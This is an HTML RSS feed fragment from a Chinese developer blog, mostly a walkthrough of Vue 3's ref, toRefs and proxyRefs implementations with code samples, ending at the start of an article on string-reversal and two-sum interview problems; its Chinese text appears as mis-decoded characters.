    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(); <span class="hljs-comment">// å‡è®¾è¿™æ˜¯ä¾èµ–æ”¶é›†å®¹å™¨</span>
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 1. ä¾èµ–æ”¶é›† (Track)</span>
    <span class="hljs-title function_">trackEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>); 
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;
  }

  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-comment">// åªæœ‰å€¼å‘ç”Ÿæ”¹å˜æ—¶æ‰è§¦å‘</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasChanged</span>(newVal, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = newVal;
      <span class="hljs-comment">// å¦‚æœæ–°å€¼æ˜¯å¯¹è±¡ï¼ŒåŒæ ·éœ€è¦è½¬æ¢</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">isObject</span>(newVal) ? <span class="hljs-title function_">reactive</span>(newVal) : newVal;
      <span class="hljs-comment">// 2. æ´¾å‘æ›´æ–° (Trigger)</span>
      <span class="hljs-title function_">triggerEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>); 
    }
  }
}

<span class="hljs-comment">// æš´éœ²å‡ºæ¥çš„ ref å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ref</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefImpl</span>(value);
}
</code></pre>
<h4 data-id="heading-4">å…³é”®ç‚¹è§£æ</h4>
<ol>
<li><code>ref</code> æœ¬è´¨ä¸Šä¼šè¿”å›ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ‹¥æœ‰ <code>.value</code> çš„è®¿é—®å™¨å±æ€§ã€‚</li>
<li><strong>__v_isRef</strong>ï¼šRefImpl ç±»éœ€è¦å¢åŠ ä¸€ä¸ª <code>__v_isRef</code> å±æ€§ç”¨äºåŒºåˆ« â€œRefå¯¹è±¡â€ä¸â€œå«æœ‰ value å±æ€§çš„æ™®é€šå¯¹è±¡â€ã€‚<code>ref</code> çš„æœ¬è´¨æ˜¯ä¸€ä¸ªæ‹¥æœ‰ <code>.value</code> å±æ€§çš„å¯¹è±¡ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰æ‹¥æœ‰ <code>.value</code> çš„å¯¹è±¡éƒ½æ˜¯ <code>ref</code>ã€‚å¦‚æœä¸å¢åŠ è¿™ä¸ªæ ‡è¯†ä½ï¼Œå¾ˆéš¾åŒºåˆ†ä¸‹é¢äºŒè€…çš„åŒºåˆ«ï¼š</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// çœŸæ­£çš„ ref</span>
<span class="hljs-keyword">const</span> realRef = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>); 
<span class="hljs-comment">// realRef ç»“æ„: { value: 1, dep: Set, __v_isRef: true, ... }</span>

<span class="hljs-comment">// ç”¨æˆ·ä¸å°å¿ƒå®šä¹‰çš„æ™®é€šå¯¹è±¡</span>
<span class="hljs-keyword">const</span> fakeRef = { <span class="hljs-attr">value</span>: <span class="hljs-number">1</span> };
<span class="hljs-comment">// fakeRef ç»“æ„: { value: 1 }</span>
</code></pre>
<p>å½“ <code>Vue</code> çš„æ¨¡æ¿ç³»ç»Ÿæˆ–è€… <code>reactive</code> å°è¯•â€œè‡ªåŠ¨è§£åŒ…â€ï¼ˆè¯»å– <code>.value</code>ï¼‰æ—¶ï¼Œå¦‚æœæ²¡æœ‰ <code>__v_isRef</code>ï¼Œç³»ç»Ÿå¯èƒ½ä¼šé”™è¯¯åœ°æŠŠç”¨æˆ·å®šä¹‰çš„ <code>fakeRef</code> ä¹Ÿå½“ä½œå“åº”å¼å¯¹è±¡å¤„ç†ï¼Œå»å°è¯•è¯»å–å®ƒçš„ä¾èµ–ï¼ˆ<code>dep</code>ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´æŠ¥é”™æˆ–é€»è¾‘æ··ä¹±ã€‚</p>
<ol start="3">
<li><strong>Getter/Setter</strong>ï¼š
<ul>
<li><code>get value()</code>ï¼šå½“è®¿é—® <code>.value</code> æ—¶ï¼Œè°ƒç”¨ <code>track</code> æ”¶é›†å½“å‰å‰¯ä½œç”¨å‡½æ•°ï¼ˆEffectï¼‰ã€‚</li>
<li><code>set value()</code>ï¼šå½“ä¿®æ”¹ <code>.value</code> æ—¶ï¼Œæ¯”è¾ƒæ–°æ—§å€¼ï¼Œè‹¥å˜åŒ–åˆ™è°ƒç”¨ <code>trigger</code> é€šçŸ¥è§†å›¾æ›´æ–°ã€‚</li>
</ul>
</li>
<li><strong>å…¼å®¹å¯¹è±¡å‚æ•°</strong>ï¼šå¦‚æœ <code>ref(obj)</code> æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæºç ä¸­ä¼šè°ƒç”¨ <code>reactive(obj)</code> å°†å…¶è½¬åŒ–ä¸ºæ·±å±‚å“åº”å¼å¯¹è±¡ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ <code>ref</code> å¯ä»¥åŒ…è£¹å¯¹è±¡ï¼Œä¸”å¯¹è±¡å†…éƒ¨å±æ€§å˜åŒ–ä¹Ÿèƒ½è§¦å‘æ›´æ–°ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-5">2. toRefs çš„åŸç†è§£æ</h3>
<h4 data-id="heading-6">ä¸ºä»€ä¹ˆéœ€è¦ toRefsï¼Ÿ</h4>
<p>å½“æˆ‘ä»¬å¯¹ä¸€ä¸ª <code>reactive</code> å¯¹è±¡è¿›è¡Œ<strong>è§£æ„</strong>æ—¶ï¼Œä¼šä¸¢å¤±å“åº”æ€§ï¼Œå› ä¸ºè§£æ„å‡ºæ¥çš„åªæ˜¯æ™®é€šçš„å˜é‡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">1</span> });
<span class="hljs-keyword">const</span> { count } = state; <span class="hljs-comment">// count æ­¤æ—¶åªæ˜¯ä¸€ä¸ªæ™®é€šæ•°å­— 1ï¼Œä¸ state æ–­å¼€è”ç³»äº†</span>
</code></pre>
<p><code>toRefs</code> çš„ä½œç”¨å°±æ˜¯æŠŠ <code>reactive</code> å¯¹è±¡çš„æ¯ä¸€ä¸ªå±æ€§éƒ½è½¬æ¢æˆä¸€ä¸ª <code>ref</code>ï¼Œä½†è¿™ä¸ª <code>ref</code> æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒ<strong>é“¾æ¥</strong>åˆ°äº†æºå¯¹è±¡ã€‚</p>
<h4 data-id="heading-7">æ ¸å¿ƒå®ç°ï¼š<code>ObjectRefImpl</code> ç±»</h4>
<p><code>toRefs</code> å†…éƒ¨å¹¶ä¸æ˜¯åˆ›å»ºæ ‡å‡†çš„ <code>RefImpl</code>ï¼Œè€Œæ˜¯åˆ›å»ºäº† <code>ObjectRefImpl</code>ã€‚å®ƒä¸å­˜å‚¨å€¼ï¼Œåªæ˜¯ä½œä¸ºæºå¯¹è±¡å±æ€§çš„â€œä»£ç†â€ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectRefImpl</span> {
  <span class="hljs-keyword">public</span> __v_isRef = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ ‡è®°ä¸º ref</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _object, <span class="hljs-comment">// æº reactive å¯¹è±¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _key     <span class="hljs-comment">// æŒ‡å®šçš„ key</span>
  </span>) {}

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// è®¿é—®æ—¶ï¼Œç›´æ¥è¯»å–æºå¯¹è±¡çš„å±æ€§</span>
    <span class="hljs-comment">// å› ä¸º _object æ˜¯å“åº”å¼çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè‡ªåŠ¨è§¦å‘æºå¯¹è±¡çš„ä¾èµ–æ”¶é›†</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>];
  }

  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-comment">// ä¿®æ”¹æ—¶ï¼Œç›´æ¥ä¿®æ”¹æºå¯¹è±¡çš„å±æ€§</span>
    <span class="hljs-comment">// è¿™é‡Œä¼šè‡ªåŠ¨è§¦å‘æºå¯¹è±¡çš„æ›´æ–°æ´¾å‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>] = newVal;
  }
}

<span class="hljs-comment">// toRef å‡½æ•°ï¼šé’ˆå¯¹å•ä¸ªå±æ€§</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toRef</span>(<span class="hljs-params"><span class="hljs-built_in">object</span>, key</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectRefImpl</span>(<span class="hljs-built_in">object</span>, key);
}

<span class="hljs-comment">// toRefs å‡½æ•°ï¼šéå†å¯¹è±¡æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toRefs</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>) {
  <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(<span class="hljs-built_in">object</span>) ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">length</span>) : {};
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">object</span>) {
    <span class="hljs-comment">// ä¸ºæ¯ä¸ªå±æ€§åˆ›å»ºä¸€ä¸ª ObjectRefImpl</span>
    ret[key] = <span class="hljs-title function_">toRef</span>(<span class="hljs-built_in">object</span>, key);
  }
  
  <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<h4 data-id="heading-8">å…³é”®ç‚¹è§£æ</h4>
<ol>
<li><code>ObjectRefImpl</code> è‡ªèº«æ²¡æœ‰ä»»ä½• <code>track</code> æˆ– <code>trigger</code> çš„é€»è¾‘ã€‚å®ƒåªæ˜¯æŠŠæ“ä½œè½¬å‘ç»™äº†æº <code>reactive</code> å¯¹è±¡ã€‚å½“æˆ‘ä»¬è·å–åˆ° <code>toRef</code> å‡½æ•°è¿”å›çš„å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å¯¹å…¶ .value å±æ€§çš„è¯»å†™å®é™…ä¸Šä¼šè½¬å‘åˆ°å¯¹ <code>this._object[this._key]</code> çš„è¯»å†™ï¼Œè‡ªç„¶å°±ä¼šè§¦å‘å…¶ <code>track</code> æˆ– <code>trigger</code> çš„é€»è¾‘ã€‚</li>
<li><code>toRefs</code> è¿”å›çš„æ˜¯ä¸€ä¸ªæ™®é€šå¯¹è±¡ï¼Œé‡Œé¢çš„å€¼å…¨æ˜¯ <code>ref</code>ã€‚è¿™ä¸ªæ™®é€šå¯¹è±¡å¯ä»¥è¢«è§£æ„ï¼Œè§£æ„å‡ºæ¥çš„å˜é‡ä¾ç„¶æ˜¯ <code>ObjectRefImpl</code> å®ä¾‹ï¼Œä¾ç„¶ä¿æŒç€å¯¹æºå¯¹è±¡çš„å¼•ç”¨ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-9">3. æ¨¡æ¿è‡ªåŠ¨è§£åŒ… (Unwrapping) åŸç†è§£æ</h3>
<h4 data-id="heading-10">ç°è±¡</h4>
<p>åœ¨ <code>setup</code> ä¸­æˆ‘ä»¬éœ€è¦ç”¨ <code>count.value</code>ï¼Œä½†åœ¨ <code>&lt;template&gt;</code> ä¸­æˆ‘ä»¬ç›´æ¥å†™ <code>{{ count }}</code> å³å¯ã€‚è¿™æ˜¯ Vue åœ¨ç¼–è¯‘å’Œæ¸²æŸ“é˜¶æ®µåšäº†ç‰¹æ®Šå¤„ç†ã€‚</p>
<h4 data-id="heading-11">æ ¸å¿ƒå®ç°ï¼š<code>proxyRefs</code></h4>
<p>é¦–å…ˆéœ€è¦ä»‹ç»ä¸¤ä¸ªè¾…åŠ©å‡½æ•°ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¦‚æœæ˜¯ ref è¿”å› .valueï¼Œå¦åˆ™è¿”å›åŸå€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">unref</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isRef</span>(ref) ? ref.<span class="hljs-property">value</span> : ref;
}
<span class="hljs-comment">// æ ¹æ®å¯¹è±¡ __v_isRef å±æ€§åˆ¤æ–­å…¶æ˜¯å¦æ˜¯ ref å¯¹è±¡</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isRef</span>(<span class="hljs-params">r: any</span>): r is <span class="hljs-title class_">Ref</span> {
  <span class="hljs-keyword">return</span> !!(r &amp;&amp; r.<span class="hljs-property">__v_isRef</span> === <span class="hljs-literal">true</span>);
}
</code></pre>
<p><code>unref</code> å‡½æ•°é¦–å…ˆåˆ¤æ–­ä¼ å…¥çš„æ˜¯å¦æ˜¯ <code>ref</code> å¯¹è±¡ï¼Œå¦‚æœæ˜¯åˆ™è¿”å› <code>ref.value</code>ï¼Œ å¦åˆ™è¿”å› <code>ref</code> æœ¬èº«ï¼Œè¿™ä¸ªå‡½æ•°æ­£æ˜¯æ¨¡æ¿è‡ªåŠ¨è§£åŒ…åŸç†çš„æ ¸å¿ƒã€‚</p>
<p>Vue åœ¨å®Œæˆå¯¹æ¨¡æ¿çš„è§£æä¹‹åï¼Œå°† <code>setup</code> çš„è¿”å›å€¼ä¼ é€’ç»™æ¸²æŸ“å‡½æ•°ä¹‹å‰ï¼Œä¼šé€šè¿‡ <code>proxyRefs</code> å‡½æ•°å¯¹å…¶è¿›è¡Œä¸€å±‚ä»£ç†ï¼Œåœ¨ä»£ç†ä¸­æ‹¦æˆªäº† get å’Œ set æ“ä½œï¼Œå¹¶é€šè¿‡ <code>unref</code> å‡½æ•°</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> shallowUnwrapHandlers = {
  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">target, key, receiver</span>) =&gt;</span> {
    <span class="hljs-comment">// 1. è·å–çœŸå®çš„å€¼</span>
    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
    <span class="hljs-comment">// 2. è‡ªåŠ¨è§£åŒ…ï¼šå¦‚æœæ˜¯ ref å°±è¿”å› value.valueï¼Œå¦åˆ™ç›´æ¥è¿”å›</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">unref</span>(value);
  },
  
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">target, key, value, receiver</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> oldValue = target[key];
    <span class="hljs-comment">// 3. ç‰¹æ®Šå¤„ç†ï¼šå¦‚æœæ—§å€¼æ˜¯ refï¼Œä½†æ–°å€¼ä¸æ˜¯ ref</span>
    <span class="hljs-comment">// æ„å‘³ç€ç”¨æˆ·æƒ³ç»™ ref èµ‹å€¼ï¼šcount.value = 1</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRef</span>(oldValue) &amp;&amp; !<span class="hljs-title function_">isRef</span>(value)) {
      oldValue.<span class="hljs-property">value</span> = value;
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } 
    <span class="hljs-comment">// å…¶ä»–æƒ…å†µç›´æ¥æ›¿æ¢</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
  }
};

<span class="hljs-comment">// Vue å†…éƒ¨ä¼šåœ¨ setupState ä¸Šå¥—è¿™ä¸€å±‚ Proxy</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">proxyRefs</span>(<span class="hljs-params">objectWithRefs</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(objectWithRefs, shallowUnwrapHandlers);
}
</code></pre>
<h4 data-id="heading-12">è¿è¡Œæµç¨‹</h4>
<ol>
<li><strong>å»ºç«‹ä»£ç†</strong>ï¼šå½“ <code>setup()</code> å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ˆåŒ…å« refï¼‰æ—¶ï¼ŒVue å†…éƒ¨è°ƒç”¨ <code>handleSetupResult</code>ï¼Œä½¿ç”¨ <code>proxyRefs</code> åŒ…è£…è¿™ä¸ªè¿”å›å¯¹è±¡ï¼Œç”Ÿæˆ render contextï¼ˆæ¸²æŸ“ä¸Šä¸‹æ–‡ï¼‰ã€‚</li>
<li><strong>æ¨¡æ¿è¯»å–</strong>ï¼š
<ul>
<li>å½“æ¨¡æ¿æ¸²æŸ“é‡åˆ° <code>{{ count }}</code> æ—¶ï¼Œå®é™…ä¸Šæ˜¯å»åœ¨è¿™ä¸ª Proxy å¯¹è±¡ä¸Šå– <code>count</code>ã€‚</li>
<li>è§¦å‘ <code>get</code> æ‹¦æˆªï¼šå‘ç° <code>count</code> æ˜¯ä¸€ä¸ª <code>ref</code>ï¼ŒProxy è‡ªåŠ¨å¸®ä½ è°ƒç”¨ <code>.value</code> å¹¶è¿”å›ç»“æœã€‚</li>
</ul>
</li>
<li><strong>æ¨¡æ¿èµ‹å€¼</strong>ï¼ˆä¾‹å¦‚ <code>v-model</code>ï¼‰ï¼š
<ul>
<li>å¦‚æœåœ¨æ¨¡æ¿ä¸­å†™ <code>&lt;input v-model="count"&gt;</code>ã€‚</li>
<li>è§¦å‘ <code>set</code> æ‹¦æˆªï¼šProxy å‘ç° <code>count</code> åŸæœ¬æ˜¯ <code>ref</code>ï¼Œè€Œè¾“å…¥çš„æ˜¯æ™®é€šå€¼ï¼Œå®ƒä¼šå°†æ–°å€¼èµ‹å€¼ç»™ <code>count.value</code>ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">æ€»ç»“</h3>

























<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æ ¸å¿ƒå®ç°ç±»/å‡½æ•°</th><th align="left">å…³é”®åŸç†</th></tr></thead><tbody><tr><td align="left"><strong>ref</strong></td><td align="left"><code>RefImpl</code></td><td align="left">åˆ©ç”¨ getter/setter åŠ«æŒ <code>.value</code> å±æ€§ï¼Œé€šè¿‡ <code>track/trigger</code> ç®¡ç†ä¾èµ–ã€‚è‹¥å€¼ä¸ºå¯¹è±¡åˆ™å€ŸåŠ© <code>reactive</code>ã€‚</td></tr><tr><td align="left"><strong>toRefs</strong></td><td align="left"><code>ObjectRefImpl</code></td><td align="left">ä¸å­˜å€¼ï¼Œä»…ä»…æ˜¯å¯¹æº <code>reactive</code> å¯¹è±¡å±æ€§çš„<strong>ä»£ç†è®¿é—®</strong>ã€‚è§£å†³äº†è§£æ„å¯¼è‡´çš„å“åº”æ€§ä¸¢å¤±é—®é¢˜ã€‚</td></tr><tr><td align="left"><strong>æ¨¡æ¿è§£åŒ…</strong></td><td align="left"><code>proxyRefs</code></td><td align="left">åˆ©ç”¨ <code>Proxy</code> æ‹¦æˆª <code>setup</code> è¿”å›å¯¹è±¡çš„è®¿é—®ï¼Œé‡åˆ° <code>ref</code> è‡ªåŠ¨è¿”å› <code>.value</code>ï¼Œå®ç°ç”±æ¨¡æ¿åˆ°æ•°æ®çš„æ— æ„Ÿè¯»å†™ã€‚</td></tr></tbody></table>
<p>é€šè¿‡é˜…è¯»è¿™éƒ¨åˆ†æºç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° Vue 3 åœ¨æ˜“ç”¨æ€§ï¼ˆè‡ªåŠ¨è§£åŒ…ï¼‰å’Œçµæ´»æ€§ï¼ˆref/reactive åˆ†ç¦»ï¼‰ä¹‹é—´åšäº†éå¸¸ç²¾å¦™çš„è®¾è®¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ” å­—ç¬¦ä¸²åè½¬ Ã— ä¸¤æ•°ä¹‹å’Œï¼šå‰ç«¯é¢è¯•é«˜é¢‘é¢˜æ·±åº¦æ‹†è§£ï¼ˆé™„5ç§åè½¬å†™æ³• + å“ˆå¸Œä¼˜åŒ–ï¼‰]]></title>    <link>https://juejin.cn/post/7576968345875300379</link>    <guid>https://juejin.cn/post/7576968345875300379</guid>    <pubDate>2025-11-27T06:21:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875300379" data-draft-id="7576105442214117426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ” å­—ç¬¦ä¸²åè½¬ Ã— ä¸¤æ•°ä¹‹å’Œï¼šå‰ç«¯é¢è¯•é«˜é¢‘é¢˜æ·±åº¦æ‹†è§£ï¼ˆé™„5ç§åè½¬å†™æ³• + å“ˆå¸Œä¼˜åŒ–ï¼‰"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T06:21:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‰å®‡å¤•è½"/> <meta itemprop="url" content="https://juejin.cn/user/3323164053734988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ” å­—ç¬¦ä¸²åè½¬ Ã— ä¸¤æ•°ä¹‹å’Œï¼šå‰ç«¯é¢è¯•é«˜é¢‘é¢˜æ·±åº¦æ‹†è§£ï¼ˆé™„5ç§åè½¬å†™æ³• + å“ˆå¸Œä¼˜åŒ–ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323164053734988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‰å®‡å¤•è½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:21:22.000Z" title="Thu Nov 27 2025 06:21:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å‰ç«¯é¢è¯•ä¸­ï¼Œ <strong>â€œåè½¬å­—ç¬¦ä¸²â€</strong> å’Œ <strong>â€œä¸¤æ•°ä¹‹å’Œâ€</strong> è™½çœ‹ä¼¼ç®€å•ï¼Œå´æ˜¯è€ƒå¯Ÿå€™é€‰äºº <strong>åŸºç¡€æ‰å®åº¦ã€ä»£ç æ€ç»´ã€API 